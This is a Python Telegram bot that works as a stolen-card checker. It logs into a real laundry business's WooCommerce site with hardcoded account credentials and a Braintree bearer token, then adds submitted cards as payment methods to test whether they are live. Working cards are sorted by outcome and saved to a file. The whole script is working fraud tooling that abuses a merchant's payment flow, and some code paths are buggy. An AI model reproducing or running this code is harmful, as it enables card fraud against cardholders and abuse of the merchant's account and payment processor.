import os
import re
import time
import json
import asyncio
import json
from html import unescape
from bs4 import BeautifulSoup

import httpx
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# ================= CONFIG ===================
OWNER_ADMIN_ID = 7519839885  # REPLACE WITH YOUR TELEGRAM USER ID (OWNER ADMIN)
ADMIN_ID_FILE = "admin_ids.txt"
# ============================================

def get_admin_chat_ids() -> set[int]:
    if os.path.exists(ADMIN_ID_FILE):
        with open(ADMIN_ID_FILE, "r") as f:
            ids = {int(line.strip()) for line in f if line.strip().isdigit()}
        return ids
    return set()

def save_admin_chat_ids(admins: set[int]) -> None:
    with open(ADMIN_ID_FILE, "w") as f:
        for aid in admins:
            f.write(f"{aid}\n")

admin_chat_ids = get_admin_chat_ids()

# HELPER FUNCTION TO EXTRACT SUBSTRING BETWEEN START AND END
def gets(s: str, start: str, end: str) -> str | None:
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

# CREATE PAYMENT METHOD WITH EXPIRY VALIDATION (revised to continue even if expiry invalid)
async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str]:
    try:
        cc, mes, ano, cvv = fullz.split("|")

        # VALIDATE EXPIRATION DATE but continue processing
        mes = mes.zfill(2)
        if len(ano) == 4:
            ano = ano[-2:]

        current_year = int(time.strftime("%y"))
        current_month = int(time.strftime("%m"))

        expiry_valid = True
        try:
            expiry_month = int(mes)
            expiry_year = int(ano)
            if expiry_month < 1 or expiry_month > 12:
                expiry_valid = False
            if expiry_year < current_year:
                expiry_valid = False
            if expiry_year == current_year and expiry_month < current_month:
                expiry_valid = False
        except ValueError:
            expiry_valid = False

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'if-modified-since': 'Mon, 25 Aug 2025 21:18:48 GMT',
            'priority': 'u=0, i',
            'referer': 'https://boltlaundry.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://boltlaundry.com/loginnow/', headers=headers)

        login = gets(response.text, '<input type="hidden" name="ihc_login_nonce" value="', '"')

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://boltlaundry.com',
            'priority': 'u=0, i',
            'referer': 'https://boltlaundry.com/loginnow/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'ihcaction': 'login',
            'ihc_login_nonce': login,
            'log': 'Lena Molina',
            'pwd': 'LenaMon12',
        }

        response = await session.post('https://boltlaundry.com/loginnow/', headers=headers, data=data)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://boltlaundry.com/loginnow/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://boltlaundry.com/my-account/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://boltlaundry.com/my-account/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://boltlaundry.com/my-account/payment-methods/', headers=headers)

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://boltlaundry.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        response = await session.get('https://boltlaundry.com/my-account/add-payment-method/', headers=headers)

        nonce = gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTYyNzk0NDIsImp0aSI6ImE4NmE4NTNkLWE2NDktNDc4MS1hYWQ3LTJmZWRiODNmYjY4MyIsInN1YiI6IjYzY21iM253Ym5wcjNmOXkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjYzY21iM253Ym5wcjNmOXkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiYm9sdGxhdW5kcnlzZXJ2aWNlX2luc3RhbnQiLCJwYXlwYWxfYWNjb3VudF9udW1iZXIiOiIyMDgwNTMyNzQwMjE1MzYwMzc1IiwicGF5cGFsX2NsaWVudF9pZCI6IkFSZmI4eS1UQThIRVViSE1obzh0b1FnZndFNUUxUUtJQlpkNnhzUmFEVkl5SUJwMC1RNkgyeHI4VllhOEZVNTdHVUJQT1pSX19kcm5RY0llIn19.eMD0-Hp8DzDXLts3bd3gQ-_7jCAfXzT4sAlNQk-7SgAJaAfLQON0qi8n1CbaZsuwNEJfN0TsBX16X6e2IaDsFA',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '606fb7a9-a397-4a6e-98ed-ed1fc4f347a0',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '99518',
                            'streetAddress': '3228 Blackwell Street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

        try:
            token = gets(response.text, '"token":"', '"')
            brand = gets(response.text, '"brandCode":"', '"')
            prepaid = gets(response.text, '"prepaid":"', '"')
            bank = gets(response.text, '"issuingBank":"', '"')
            country = gets(response.text, '"countryOfIssuance":"', '"')
        except Exception:
            return response.text, '', '', ''

        error_message = None
        if 'error' in response.text:
            error_message = response.text['error'].get('message', '')

        if not expiry_valid and error_message is None:
            error_message = "Expiration date invalid. "

        if error_message:
            return error_message, country, brand, bank, prepaid

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://boltlaundry.com',
            'priority': 'u=0, i',
            'referer': 'https://boltlaundry.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '',
            'braintree_cc_3ds_nonce_key': '',
            'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/63cmb3nwbnpr3f9y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/63cmb3nwbnpr3f9y"},"merchantId":"63cmb3nwbnpr3f9y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bolt Laundry service","clientId":"ARfb8y-TA8HEUbHMho8toQgfwE5E1QKIBZd6xsRaDVIyIBp0-Q6H2xr8VYa8FU57GUBPOZR__drnQcIe","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"boltlaundryservice_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
            'woocommerce-add-payment-method-nonce': nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        response = await session.post('https://boltlaundry.com/my-account/add-payment-method/', headers=headers, data=data, follow_redirects=True)

        return response.text, country, brand, bank, prepaid

    except Exception as e:
        return f"EXCEPTION: {str(e)}", '', '', ''

# FUNCTION MAPS API RESPONSE TEXT TO FRIENDLY MESSAGE
async def charge_resp(result):
    try:
        if (
            '{"status":"SUCCESS",' in result
            or '"status":"success"' in result
            or 'Payment method successfully added.' in result
        ):
            response = "Approved ✅"
        elif "Thank you for your donation" in result:
            response = "PAYMENT SUCCESSFUL! 🎉"
        elif "insufficient funds" in result or "card has insufficient funds." in result:
            response = "INSUFFICIENT FUNDS ✅"
        elif "Your card has insufficient funds." in result:
            response = "INSUFFICIENT FUNDS ✅"
        elif (
            "incorrect_cvc" in result
            or "security code is incorrect." in result
            or "Your card's security code is incorrect." in result
        ):
            response = "CVV INCORRECT ❎"
        elif "transaction_not_allowed" in result:
            response = "TRANSACTION NOT ALLOWED ❎"
        elif '"cvc_check": "pass"' in result:
            response = "CVV MATCH ✅"
        elif "requires_action" in result:
            response = "VERIFICATION 🚫"
        elif (
            "three_d_secure_redirect" in result
            or "card_error_authentication_required" in result
            or "wcpay-confirm-pi:" in result
        ):
            response = "3DS REQUIRED ❎"
        elif "stripe_3ds2_fingerprint" in result:
            response = "3DS REQUIRED ❎"
        elif "Your card does not support this type of purchase." in result:
            response = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
        elif (
            "generic_decline" in result
            or "You have exceeded the maximum number of declines on this card in the last 24 hour period."
            in result
            or "card_decline_rate_limit_exceeded" in result
            or "This transaction cannot be processed." in result
            or '"status":400,' in result
        ):
            response = "GENERIC DECLINED ❌"
        elif "do not honor" in result:
            response = "DO NOT HONOR ❌"
        elif "Suspicious activity detected. Try again in a few minutes." in result:
            response = "TRY AGAIN IN A FEW MINUTES ❌"
        elif "fraudulent" in result:
            response = "FRAUDULENT ❌ "
        elif "setup_intent_authentication_failure" in result:
            response = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
        elif "invalid cvc" in result:
            response = "INVALID CVV ❌"
        elif "stolen card" in result:
            response = "STOLEN CARD ❌"
        elif "lost_card" in result:
            response = "LOST CARD ❌"
        elif "pickup_card" in result:
            response = "PICKUP CARD ❌"
        elif "incorrect_number" in result:
            response = "INCORRECT CARD NUMBER ❌"
        elif "Your card has expired." in result or "expired_card" in result:
            response = "EXPIRED CARD ❌"
        elif "intent_confirmation_challenge" in result:
            response = "CAPTCHA ❌"
        elif "Your card number is incorrect." in result:
            response = "INCORRECT CARD NUMBER ❌"
        elif (
            "Your card's expiration year is invalid." in result
            or "Your card's expiration year is invalid." in result
        ):
            response = "EXPIRATION YEAR INVALID ❌"
        elif (
            "Your card's expiration month is invalid." in result
            or "invalid_expiry_month" in result
        ):
            response = "EXPIRATION MONTH INVALID ❌"
        elif "card is not supported." in result:
            response = "CARD NOT SUPPORTED ❌"
        elif "invalid account" in result:
            response = "DEAD CARD ❌"
        elif (
            "Invalid API Key provided" in result
            or "testmode_charges_only" in result
            or "api_key_expired" in result
            or "Your account cannot currently make live charges." in result
        ):
            response = "STRIPE ERROR, CONTACT SUPPORT@STRIPE.COM FOR DETAILS ❌"
        elif "Your card was declined." in result or "card was declined" in result:
            response = "CARD DECLINED ❌"
        elif "card number is incorrect." in result:
            response = "CARD NUMBER INCORRECT ❌"
        elif "Sorry, we are unable to process your payment at this time. Please retry later." in result:
            response = "SORRY, PAYMENT CANNOT BE PROCESSED AT THIS TIME. PLEASE RETRY LATER ⏳"
        elif "card number is incomplete." in result:
            response = "CARD NUMBER INCOMPLETE ❌"
        elif "The order total is too high for this payment method" in result:
            response = "ORDER TOO HIGH FOR THIS CARD ❌"
        elif "The order total is too low for this payment method" in result:
            response = "ORDER TOO LOW FOR THIS CARD ❌"
        elif "Please Update Bearer Token" in result:
            response = "TOKEN EXPIRED, ADMIN HAS BEEN NOTIFIED ❌"
        else:
            response = result + "❌"
            with open("result_logs.txt", "a", encoding="utf-8") as f:
                f.write(f"{result}\n")

        return response
    except Exception as e:
        return f"{str(e)} ❌"

async def multi_checking(fullz: str) -> str:
    start = time.time()
    async with httpx.AsyncClient(timeout=40) as session:
        result, country, brand, bank, prepaid = await create_payment_method(fullz, session)
        response = await charge_resp(result)

    elapsed = round(time.time() - start, 2)

    error_message = ""
    response = ""

    try:
        json_resp = json.loads(result)
        if "error" in json_resp and "message" in json_resp["error"]:
            raw_html = unescape(json_resp["error"]["message"])
            soup = BeautifulSoup(raw_html, "html.parser")
            div = soup.find("div", class_="message-container")
            if div:
                error_message = div.get_text(separator=" ", strip=True)
    except Exception:
        try:
            soup = BeautifulSoup(unescape(result), "html.parser")
            div = soup.find("div", class_="message-container")
            if div:
                error_message = div.get_text(separator=" ", strip=True)
        except Exception:
            error_message = ""

    if "Payment method successfully added." in error_message:
        response = "Approved ✅"
        error_message = ""
    else:
        response = "Expiration date invalid ❌"

    if error_message:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
            f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
            f"𝗕𝗮𝗻𝗸: » {bank}\n"
            f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
        )
    else:
        output = (
            f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: » {country}\n"
            f"𝗕𝗿𝗮𝗻𝗱: » {brand}\n"
            f"𝗕𝗮𝗻𝗸: » {bank}\n"
            f"𝗣𝗿𝗲𝗽𝗮𝗶𝗱: » {prepaid}\n"
            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
        )
        if any(key in response for key in ["Approved", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
            with open("auth.txt", "a", encoding="utf-8") as file:
                file.write(output + "\n")

    return output

TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    global admin_chat_ids

    if not admin_chat_ids:
        if chat_id == OWNER_ADMIN_ID:
            admin_chat_ids.add(chat_id)
            save_admin_chat_ids(admin_chat_ids)
            await update.message.reply_text(
                f"𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗢𝗪𝗡𝗘𝗥 🤗\n"
                "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
            )
        else:
            await update.message.reply_text("BOT IS NOT CONFIGURED YET, ONLY OWNER ADMIN CAN REGISTER FIRST.")
        return

    if chat_id not in admin_chat_ids:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return

    await update.message.reply_text(
        "𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
        "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
    )

async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    global admin_chat_ids

    if chat_id != OWNER_ADMIN_ID:
        await update.message.reply_text("ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN ❌")
        return

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("/addadmin USER ID")
        return

    try:
        new_admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
        return

    if new_admin_id in admin_chat_ids:
        await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN.")
        return

    admin_chat_ids.add(new_admin_id)
    save_admin_chat_ids(admin_chat_ids)
    await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")

async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.effective_chat.id
    global admin_chat_ids

    if chat_id != OWNER_ADMIN_ID:
        await update.message.reply_text("ONLY OWNER ADMIN CAN REMOVE AN ADMIN ❌")
        return

    if not context.args or len(context.args) != 1:
        await update.message.reply_text("/deladmin USER ID")
        return

    try:
        remove_admin_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
        return

    if remove_admin_id not in admin_chat_ids:
        await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN.")
        return

    if remove_admin_id == OWNER_ADMIN_ID:
        await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN ❌")
        return

    admin_chat_ids.remove(remove_admin_id)
    save_admin_chat_ids(admin_chat_ids)
    await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")

async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_chat.id not in admin_chat_ids:
        await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        return

    text = update.message.text.strip()

    raw_cards = []
    for line in text.splitlines():
        for part in line.strip().split():
            if part:
                raw_cards.append(part.strip())

    if not raw_cards:
        await update.message.reply_text("NO CARD DATA FOUND IN MESSAGE.")
        return

    msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')

    try:
        for fullz in raw_cards:
            parts = fullz.split("|")
            if len(parts) != 4:
                await update.message.reply_text(
                    f"WRONG FORMAT:\n<code>{fullz}</code>\nUSE FORMAT CC|MM|YYYY|CVV",
                    parse_mode='HTML'
                )
                continue

            cc_num, month, year, cvv = parts
            if len(year) == 4:
                year = year[-2:]

            cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"

            await asyncio.sleep(20)

            result = await multi_checking(cc_formatted)
            await update.message.reply_text(result, parse_mode='HTML')

        await msg.delete()

    except Exception as e:
        await update.message.reply_text(f"ERROR: {str(e)}")


def main() -> None:
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addadmin", addadmin))
    application.add_handler(CommandHandler("deladmin", deladmin))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))

    print("PARAEL CHECKER BOT RUNNING...")
    application.run_polling()


if __name__ == "__main__":
    main()
